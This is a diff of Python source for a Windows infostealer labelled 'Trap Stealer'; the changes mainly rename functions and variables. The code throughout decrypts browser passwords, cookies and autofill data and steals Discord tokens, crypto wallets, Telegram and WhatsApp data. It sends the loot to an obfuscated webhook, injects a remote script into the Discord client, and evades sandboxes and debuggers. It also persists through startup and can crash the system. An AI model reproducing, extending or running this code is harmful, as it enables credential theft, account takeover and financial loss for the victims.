@@ -1,12 +1,13 @@
 import sys, time, random, threading, ctypes, string
 import os, re, socket, subprocess
+import winreg
 from urllib.parse import urlparse
 from os.path import isfile, exists
 from shutil import copy
 import sqlite3
 from base64 import b64decode
 import winreg
-import zipfile 
+import zipfile
 from zipfile import ZipFile
 import shutil
 import tempfile
@@ -21,7 +22,7 @@ FakeWebhook = '%FakeWebhook%'
 Fakegen = '%FakeGen%' 
 injection = '%Injection%'
 Startup = '%Startup%'
-antidebugging = '%No_Debug%'   
+antidebugging = '%No_Debug%'  
 DiscordStop = '%Close%' 
 OneTimeSteal = '%Onetime%'
 melter = '%Melter%'
@@ -40,6 +41,7 @@ if Startup == False:
     StartupMessage = 'Adding to startup disabled in the config'
 else:
     StartupMessage = 'Error while adding Trap into the startup folder' 
+    
 requirements = [
     ["requests", "requests"],
     ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodomex']
@@ -58,6 +60,7 @@ except:
     from Crypto.Cipher import AES
     
 import requests
+
 def sql_connect(database_path):
     conn = sqlite3.connect(database_path)
     return conn
@@ -75,10 +78,9 @@ if in_virtualenv() == True:
 def clear_command_prompt():
     if os.name == 'nt':
         os.system('cls')
-    else:
-        os.system('clear')
+
 def antidebug():
-    checks = [check_username,check_windows, check_ip, checkre, check_dll]
+    checks = [check_username,check_windows, check_ip, CheckRegistry, check_dll]
     for check in checks:
         t = threading.Thread(target=check, daemon=True)
         t.start()
@@ -88,11 +90,11 @@ def exit_program(reason):
     ctypes.windll.kernel32.ExitProcess(0)
 
 def check_username():
-    blacli = ['geRnzryUBczGR' ,'tset' ,'10resU' ,'esiuoL' ,'rPx1kd7h' ,'XetaP' ,'ekim' ,'sacuL' ,'G3fOFgqS' ,'nosnhoJ yrraH' ,'nxsnPRhCJvB' ,'revres' ,'derf' ,'lzReUEH' ,'ailuJ' ,'8m9v2u3' ,'SsxewVHjNOqP' ,'b9jjwVml' ,'A5PcCmVOujf0w' ,'MSziV8' ,'xyVpOUdmxP' ,'egroeg' ,'nhoJ' ,'asiL' ,'qb5QNloC0lN8' ,'knarF' ,'nhoJ' 'tnuoccAytilitUGADW','TJG1W3' ,'xetap' ,'cramh' ,'ybbA' ,'jgwMfceEk' ,'MWVJBSZQ' ,'HS9HYSI5' ,'XzveFNC0JhDR']
+    Blacklisted = ['geRnzryUBczGR' ,'tset' ,'10resU' ,'esiuoL' ,'rPx1kd7h' ,'XetaP' ,'ekim' ,'sacuL' ,'G3fOFgqS' ,'nosnhoJ yrraH' ,'nxsnPRhCJvB' ,'revres' ,'derf' ,'lzReUEH' ,'ailuJ' ,'8m9v2u3' ,'SsxewVHjNOqP' ,'b9jjwVml' ,'A5PcCmVOujf0w' ,'MSziV8' ,'xyVpOUdmxP' ,'egroeg' ,'nhoJ' ,'asiL' ,'qb5QNloC0lN8' ,'knarF' ,'nhoJ' 'tnuoccAytilitUGADW','TJG1W3' ,'xetap' ,'cramh' ,'ybbA' ,'jgwMfceEk' ,'MWVJBSZQ' ,'HS9HYSI5' ,'XzveFNC0JhDR']
 
     username = os.getenv("COMPUTERNAME")
 
-    if username in blacli[::-1]:
+    if username in Blacklisted[::-1]:
         exit_program('Invalid username')
         
 def check_windows():
@@ -148,7 +150,7 @@ def check_ip():
         except:
             pass
         
-def checkre():
+def CheckRegistry():
         reg1 = os.system(
             "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul"
         )
@@ -206,7 +208,6 @@ def webhook_tools():
         else:
             print('Wrong input')
             time.sleep(1)
-
     except:
         pass
 
@@ -230,7 +231,7 @@ def GetData(blob_out):
     windll.kernel32.LocalFree(pbData)
     return buffer.raw
 
-def cryptunproct(encrypted_bytes, entropy=b''):
+def CryptUnprotected(encrypted_bytes, entropy=b''):
     buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
     buffer_entropy = c_buffer(entropy, len(entropy))
     blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
@@ -290,7 +291,7 @@ def fakegen():
         print(f"An error occurred: {e}")
 
 
-def dcrvalue(buff, master_key=None):
+def DecryptValue(buff, master_key=None):
         starts = buff.decode(encoding='utf8', errors='ignore')[:3]
         if starts == 'v10' or starts == 'v11':
             iv = buff[3:15]
@@ -343,7 +344,7 @@ def create_copy_and_return_new_path():
     
     return new_path
 
-def deobf(encrypted_text, key):
+def DeobfuscateWeb(encrypted_text, key):
     decrypted = [0] * 256
     for i, char in enumerate(key):
         decrypted[char] = i
@@ -417,7 +418,7 @@ def startup():
     
 def LoadUrlib(hook, data='', files='', headers=''):
     
-    hook = deobf(webhook[0],webhook[1]).decode()
+    hook = DeobfuscateWeb(webhook[0],webhook[1]).decode()
     for i in range(8):
         try:
             if headers != '':
@@ -467,7 +468,7 @@ def idisc():
                     for file in files:
                         if file == f'{ind[::-1]}' and 'discord_desktop_core-' in root:
                             file_path = os.path.join(root, file)
-                            hook = deobf(webhook[0],webhook[1]).decode()
+                            hook = DeobfuscateWeb(webhook[0],webhook[1]).decode()
                             inj_content = urlopen(inj_url).read().decode().replace("%WEBHOOK%", hook)
                             with open(file_path, "w", encoding="utf-8") as f:
                                 f.write(inj_content)
@@ -672,8 +673,8 @@ baddglist = [
 ]
 
 
-atfiCount = 0
-atfi = []
+Autofill_count = 0
+Autofill = []
 
 
 def writeforfile(data, name):
@@ -685,10 +686,10 @@ def writeforfile(data, name):
                 f.write(f"{line}\n")
 
 
-def getaut(path, arg):
+def GetAutofill(path, arg):
     
     try:
-        global atfi, atfiCount
+        global Autofill, Autofill_count
         if not os.path.exists(path): return
 
         pathC = path + arg + "/Web Data"
@@ -706,14 +707,14 @@ def getaut(path, arg):
 
         for row in data:
             if row[0] != '':
-                atfi.append(f"Name: {row[0]} | Value: {row[1]}")
-                atfi += 1
-        writeforfile(atfi, 'autofill')
+                Autofill.append(f"Name: {row[0]} | Value: {row[1]}")
+                Autofill += 1
+        writeforfile(Autofill, 'autofill')
     except Exception as e:
-        writeforfile(atfi, 'autofill')
+        writeforfile(Autofill, 'autofill')
 
 
-def userinfo():
+def UserInfo():
     try:
         def execute_command(command):
             try:
@@ -769,6 +770,8 @@ def userinfo():
 
         with open(output_file_path, "w") as f:
             f.writelines(lines)
+            
+        
             
         return upload_file(output_file_path)
     except:
@@ -1478,11 +1481,11 @@ def create_browser_zip(browser_name, find_history_func, temp_dir):
 def crashs():
     ntdll = ctypes.WinDLL('ntdll.dll')
 
-    rtld = ntdll.RtlAdjustPrivilege
-    rtld.argtypes = (ctypes.c_ulong, ctypes.c_bool, ctypes.c_bool, ctypes.POINTER(ctypes.c_bool))
-    rtld.restype = ctypes.c_ulong
+    RtAdjust = ntdll.RtlAdjustPrivilege
+    RtAdjust.argtypes = (ctypes.c_ulong, ctypes.c_bool, ctypes.c_bool, ctypes.POINTER(ctypes.c_bool))
+    RtAdjust.restype = ctypes.c_ulong
     PrivilegeState = ctypes.c_bool(False)
-    rtld(19, True, False, ctypes.byref(PrivilegeState))
+    RtAdjust(19, True, False, ctypes.byref(PrivilegeState))
 
     s = ntdll.NtRaiseHardError
     s.argtypes = (
@@ -1580,7 +1583,8 @@ def getTokq(path, arg):
                                 if not Tokq in Tokqs:
                                     Tokqs += Tokq
                                     uploadTokq(Tokq, path)
-    except:pass
+    except:
+        pass
 def GetDiscord(path, arg):
     try:
         if not os.path.exists(f"{path}/Local State"): return
@@ -1590,14 +1594,14 @@ def GetDiscord(path, arg):
         pathKey = path + "/Local State"
         with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
         master_key = b64decode(local_state['os_crypt']['encrypted_key'])
-        master_key = cryptunproct(master_key[5:])
+        master_key = CryptUnprotected(master_key[5:])
         
         for file in os.listdir(pathC):
             if file.endswith(".log") or file.endswith(".ldb"):
                 for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                     for Tokq in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                         global Tokqs
-                        TokqDecoded = dcrvalue(b64decode(Tokq.split('dQw4w9WgXcQ:')[1]), master_key)
+                        TokqDecoded = DecryptValue(b64decode(Tokq.split('dQw4w9WgXcQ:')[1]), master_key)
                         if checkTokq(TokqDecoded):
                             if not TokqDecoded in Tokqs:
                                 Tokqs += TokqDecoded
@@ -1613,7 +1617,7 @@ Passw = []
 def getPassw(path, arg):
 
     try:
-        def dcrvalue(buff, master_key=None):
+        def DecryptValue(buff, master_key=None):
             starts = buff.decode(encoding='utf8', errors='ignore')[:3]
             if starts == 'v10' or starts == 'v11':
                 iv = buff[3:15]
@@ -1640,18 +1644,18 @@ def getPassw(path, arg):
         cursor.close()
         conn.close()
         os.remove(tempfold)
-        es = 'tpyrc_so'
-        ess= 'yek_detpyrcne'
+        Os_Cr = 'tpyrc_so'
+        Encrypt_Key = 'yek_detpyrcne'
         pathKey = path + "/Local State"
         with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
-        master_key = b64decode(local_state[es[::-1]][ess[::-1]])
-        master_key = cryptunproct(master_key[5:])
+        master_key = b64decode(local_state[Os_Cr[::-1]][Encrypt_Key[::-1]])
+        master_key = CryptUnprotected(master_key[5:])
 
         for row in data: 
             if row[0] != '':
-                us = 'emanresU'
-                ur = 'lrU'
-                Passw.append(f"{ur[::-1]}: {row[0]} | {us[::-1]}: {row[1]} | {pas[::-1]}: {dcrvalue(row[2], master_key)}")
+                User = 'emanresU'
+                Url = 'lrU'
+                Passw.append(f"{Url[::-1]}: {row[0]} | {User[::-1]}: {row[1]} | {pas[::-1]}: {DecryptValue(row[2], master_key)}")
                 PasswCount += 1
         writeforfile(Passw, 'passw')
     except Exception as e:
@@ -1663,7 +1667,7 @@ def getinfo():
             sysinfo_future = executor.submit(systemInfo)
             globalinfo_future = executor.submit(globalInfo)
             clipboardtext_future = executor.submit(clip)
-            useri = executor.submit(userinfo)
+            useri = executor.submit(UserInfo)
 
             sysinfo = sysinfo_future.result()
             globalinfo = globalinfo_future.result()
@@ -1890,7 +1894,7 @@ def list_files_in_directory(directory, level=0, max_display=100):
 
     return "\n".join(file_list)
 
-def getwhatsapp(base_directory, zip_file_path):
+def Get_Whatsapp(base_directory, zip_file_path):
     try:
         all_files = []
 
@@ -1915,9 +1919,9 @@ def getwhatsapp(base_directory, zip_file_path):
     except:
         pass
     
-def uploadwa():
+def Upload_Whatsapp():
     try:
-        x, y = getwhatsapp(f"{os.getenv('LOCALAPPDATA')}\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm", os.path.join(os.getenv("TEMP"), "winwlogs.zip"))
+        x, y = Get_Whatsapp(f"{os.getenv('LOCALAPPDATA')}\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm", os.path.join(os.getenv("TEMP"), "winwlogs.zip"))
             
         url = upload_file(y)
 
@@ -1954,14 +1958,14 @@ def uploadwa():
     except:
         pass
     
-def bypass_bd():
+def Bypass_Better_Discord():
     try:
-        bd_pathsss = os.path.join(os.getenv("appdata"), "BetterDiscord", "data", "betterdiscord.asar")
+        BetterDiscord_Path = os.path.join(os.getenv("appdata"), "BetterDiscord", "data", "betterdiscord.asar")
 
-        with open(bd_pathsss, "r", encoding="cp437") as f:
+        with open(BetterDiscord_Path, "r", encoding="cp437") as f:
             content = f.read().replace("api/webhook", "Err: 444")
 
-        with open(bd_pathsss, "w", encoding="cp437") as f:
+        with open(BetterDiscord_Path, "w", encoding="cp437") as f:
             f.write(content)
     except: 
         pass
@@ -2068,9 +2072,6 @@ def srcs():
 
             os.remove(screenshot_path)
 
-        else:
-            command = ["import", "-window", "root", img_path]
-
     except Exception as e:
         pass
 url_dict = {}
@@ -2131,7 +2132,7 @@ def paaz(filetype):
                 "embeds": [
                     {
                         "title": f"🍪 Trap Stealer {'drowssaP'[::-1]} and cookies",
-                        "description": f"Number of {pas[::-1]} : {PasswCount}\nNumber of cookies : {CookiCount}\nNumber of autofill item : {atfiCount}",
+                        "description": f"Number of {pas[::-1]} : {PasswCount}\nNumber of cookies : {CookiCount}\nNumber of autofill item : {Autofill_count}",
                         "color": 0xffb6c1,
                         "fields": [
                             {"name": "wppassw.txt", "value": f"[Click here to download]({url_dict.get('passw', '')})"},
@@ -2813,11 +2814,11 @@ def spotify(cookie):
     
 def cokssite():
     try:
-        coks = os.getenv("TEMP") + f"\wpcook.txt"
-        with open(coks, 'r') as f:
+        Cookies = os.getenv("TEMP") + f"\wpcook.txt"
+        with open(Cookies, 'r') as f:
             lines = f.readlines()
             l = []
-            threa = []
+            Thread = []
             first = ''
             second = ''
             for line in lines:
@@ -2831,14 +2832,14 @@ def cokssite():
                         l.append(cookie)
                         r = threading.Thread(target=roblox, args=[cookie])
                         r.start()
-                        threa.append(r)
+                        Thread.append(r)
                     elif '.tiktok.com' in line:
                         if "sessionid" in line:
                             parts = line.split()
                             cookie = parts[2]
                             t = threading.Thread(target=TikTokSession, args=[cookie])
                             t.start()
-                            threa.append(t)
+                            Thread.append(t)
                             l.append(parts[2])
                     elif '.spotify.com' in line:
                         if "sp_dc" in line:
@@ -2846,7 +2847,7 @@ def cokssite():
                             cookie = parts[2]
                             s = threading.Thread(target=spotify, args=[cookie])
                             s.start()
-                            threa.append(s)
+                            Thread.append(s)
                             l.append(parts[2])
                     elif '.guilded.gg' in line:
                         if 'hmac_signed_session' in line:
@@ -2854,7 +2855,7 @@ def cokssite():
                             cookie = parts[2]
                             g = threading.Thread(target=guilded, args=[cookie])
                             g.start()
-                            threa.append(g)
+                            Thread.append(g)
                             l.append(parts[2])
                     elif '.patreon.com' in line:
                         if 'session_id' in line:
@@ -2862,7 +2863,7 @@ def cokssite():
                             cookie = parts[2]
                             p = threading.Thread(target=patreon, args=[cookie])
                             p.start()
-                            threa.append(p)
+                            Thread.append(p)
                             l.append(parts[2])
                     elif '.twitch.tv' in line:
                         if 'auth-token' in line:
@@ -2875,7 +2876,7 @@ def cokssite():
                     if first != '' and  second != '':
                         t = threading.Thread(target=twitch_session, args=[first, second])
                         t.start()
-                        threa.append(t)
+                        Thread.append(t)
                         l.append(first)
                         l.append(second)
                         first, second = '',''
@@ -2883,7 +2884,7 @@ def cokssite():
                     pass
                         
              
-            for thread in threa:
+            for thread in Thread:
                 thread.join()
     except Exception as e:
         pass
@@ -2918,12 +2919,12 @@ def getCook(path, arg):
 
         with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
         master_key = b64decode(local_state['os_crypt']['encrypted_key'])
-        master_key = cryptunproct(master_key[5:])
+        master_key = CryptUnprotected(master_key[5:])
   
         for row in data: 
             if row[0] != '':
 
-                Cookies.append(f"{row[0]}     {row[1]}        {dcrvalue(row[2], master_key)}")
+                Cookies.append(f"{row[0]}     {row[1]}        {DecryptValue(row[2], master_key)}")
                 CookiCount += 1
 
         writeforfile(Cookies, 'cook')
@@ -3005,7 +3006,6 @@ def gatha():
     global PasswCount
     global injection
     global DiscordStop
-    c = 'emorhc'
     browserPaths = [        
         [f"{roaming}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
         [f"{roaming}/Opera Software/Opera Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
@@ -3017,18 +3017,17 @@ def gatha():
         [f"{local}/Microsoft/Edge/User Data", "edge.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ]
         
     ]
-    d = 'drocsiD'
-    ddd = 'btpdrocsid'
-    dd = 'drocthgiL'
-    dddd = 'yranacdrocsid'
+    Discord = 'drocsiD'
+    Lightcord = 'drocthgiL'
+    BTPdiscord = 'btpdrocsid'
+    Canary = 'yranacdrocsid'
     discordPaths = [        
-        [f"{roaming}/{d[::-1]}", "/Local Storage/leveldb"],
-        [f"{roaming}/{dd[::-1]}", "/Local Storage/leveldb"],
-        [f"{roaming}/{dddd[::-1]}", "/Local Storage/leveldb"],
-        [f"{roaming}/{ddd[::-1]}", "/Local Storage/leveldb"],
+        [f"{roaming}/{Discord[::-1]}", "/Local Storage/leveldb"],
+        [f"{roaming}/{Lightcord[::-1]}", "/Local Storage/leveldb"],
+        [f"{roaming}/{Canary[::-1]}", "/Local Storage/leveldb"],
+        [f"{roaming}/{BTPdiscord[::-1]}", "/Local Storage/leveldb"],
         
     ]
-    zefez = 'tellaW'
     PathsToZip = [
         [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
         [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
@@ -3037,13 +3036,13 @@ def gatha():
         [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
     ]
     Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]
-    aa = []
-    co = []
+    First_Thread = []
+    Second_Thread = []
     try:
         if antidebugging == True:
             ad = threading.Thread(target=antidebug)
             ad.start()
-            aa.append(ad)
+            First_Thread.append(ad)
         else:
             pass
     except:
@@ -3058,97 +3057,97 @@ def gatha():
     for patt in browserPaths:
         pa = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
         pa.start()
-        co.append(pa)
+        Second_Thread.append(pa)
         
     for patt in browserPaths: 
         getc = threading.Thread(target=getCook, args=[patt[0], patt[4]])
         getc.start()
-        co.append(getc)
+        Second_Thread.append(getc)
         
         
     for patt in browserPaths:
-        autof = threading.Thread(target=getaut,args=[patt[0], patt[3]])
+        autof = threading.Thread(target=GetAutofill,args=[patt[0], patt[3]])
         autof.start()
-        co.append(autof)
+        Second_Thread.append(autof)
         
     frfc = threading.Thread(target=frcook)
     frfc.start()
-    co.append(frfc)
+    Second_Thread.append(frfc)
         
     for patt in browserPaths:
         tokq = threading.Thread(target=getTokq, args=[patt[0], patt[2]])
         tokq.start()
-        aa.append(tokq)
+        First_Thread.append(tokq)
     btk = threading.Thread(target=bypass_token_protector)
     btk.start()
-    aa.append(btk)
+    First_Thread.append(btk)
     
-    bd = threading.Thread(target=bypass_bd)
+    bd = threading.Thread(target=Bypass_Better_Discord)
     bd.start()
-    aa.append(bd)
+    First_Thread.append(bd)
     
     getinf = threading.Thread(target=getinfo)
     getinf.start()
-    aa.append(getinf)
+    First_Thread.append(getinf)
     
     if Fakegen == True:
         us = threading.Thread(target=fakegen)
         us.start()
-        aa.append(us)
+        First_Thread.append(us)
     else:
         pass
     if FakeWebhook == True:
         wb = threading.Thread(target=webhook_tools)
         wb.start()
-        aa.append(wb)
+        First_Thread.append(wb)
         
-    for thread in co:
+    for thread in Second_Thread:
         thread.join()
 
     fls = ['cook', 'autof', 'passw']
     for item in fls:
         datas = threading.Thread(target=paaz, args=[item])
         datas.start()
-        co.append(datas)
+        Second_Thread.append(datas)
         
     
     if OneTimeSteal == True:
         ots = threading.Thread(target=antispam)
         ots.start()
-        aa.append(ots)
+        First_Thread.append(ots)
 
     if Startup == True:
         sta = threading.Thread(target=startup)
         sta.start()
-        aa.append(sta)
+        First_Thread.append(sta)
     else:
         pass
 
     gatz = threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram])
     gatz.start()
-    aa.append(gatz)
+    First_Thread.append(gatz)
     
     upfd = threading.Thread(target=upload_files_to_discord)
     upfd.start()
-    aa.append(upfd)
+    First_Thread.append(upfd)
     
     hist = threading.Thread(target=histup)
     hist.start()
-    aa.append(hist)
+    First_Thread.append(hist)
         
-    uploadw = threading.Thread(target=uploadwa)
+    uploadw = threading.Thread(target=Upload_Whatsapp)
     uploadw.start()
-    aa.append(uploadw)
+    First_Thread.append(uploadw)
     
     scr = threading.Thread(target=srcs)
     scr.start()
-    aa.append(scr)
+    First_Thread.append(scr)
     
     if injection == True:
         try:
             ij = threading.Thread(target=idisc)
             ij.start()
-            aa.append(ij)
+            First_Thread.append(ij)
             
             NoDiscord = False
         except:
@@ -3159,7 +3158,7 @@ def gatha():
         if NoDiscord == True:
             no = threading.Thread(target=NoDiscord)
             no.start()
-            aa.append(no)
+            First_Thread.append(no)
             injection = False
         else:
             pass
@@ -3169,18 +3168,18 @@ def gatha():
     for patt in discordPaths:
         di = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
         di.start()
-        aa.append(di)
+        First_Thread.append(di)
     
-    for thread in co:
+    for thread in Second_Thread:
         thread.join()
         
     it = ['uploooad']
     for item in it:
         datas = threading.Thread(target=paaz, args=[item])
         datas.start()
-        aa.append(datas)
+        First_Thread.append(datas)
 
-    for thread in aa:
+    for thread in First_Thread:
         thread.join()
         
     if crasher == True:
